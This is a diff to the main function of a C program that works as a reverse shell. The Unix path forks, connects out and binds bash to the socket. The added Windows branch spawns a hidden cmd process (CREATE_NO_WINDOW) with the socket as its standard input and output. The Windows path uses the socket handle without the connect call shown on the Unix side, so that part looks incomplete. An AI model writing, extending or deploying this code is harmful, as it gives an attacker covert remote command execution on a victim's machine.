@@ -28,23 +28,33 @@ int	main(int argc, char **argv, char **envp)
 
 	#if defined(_WIN32)
 		WSADATA	d;
-		if (WSAStarup(MAKEWORD(2, 2), &d))
+		if (WSAStartup(MAKEWORD(2, 2), &d))
 			return (1);
-	#endif
 
-	(void) argc;
-	(void) argv;
-	if (fork() != 0)
-		return (0);
-	if (connect_client(&fd) != 0)
-		return (0);
-	char *args[] = {"/bin/sh", NULL};
-	dup2(fd, 0);
-	dup2(fd, 1);
-	dup2(fd, 2);
-	execve("/bin/bash", args, envp);
+		STARTUPINFO sinfo;
+		memset(&sinfo, 0, sizeof(sinfo));
+		sinfo.cb = sizeof(sinfo);
+		sinfo.dwFlags = (STARTF_USESTDHANDLES);
+		sinfo.hStdInput = (HANDLE) fd;
+		sinfo.hStdOutput = (HANDLE) fd;
+		sinfo.hStdError = (HANDLE) fd;
 
-	#if defined(_WIN32)
+		PROCESS_INFORMATION pinfo;
+		CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+		
 		WSACleanup();
+
+	#else
+		(void) argc;
+		(void) argv;
+		if (fork() != 0)
+			return (0);
+		if (connect_client(&fd) != 0)
+			return (0);
+		char *args[] = {"/bin/sh", NULL};
+		dup2(fd, 0);
+		dup2(fd, 1);
+		dup2(fd, 2);
+		execve("/bin/bash", args, envp);
 	#endif
 }
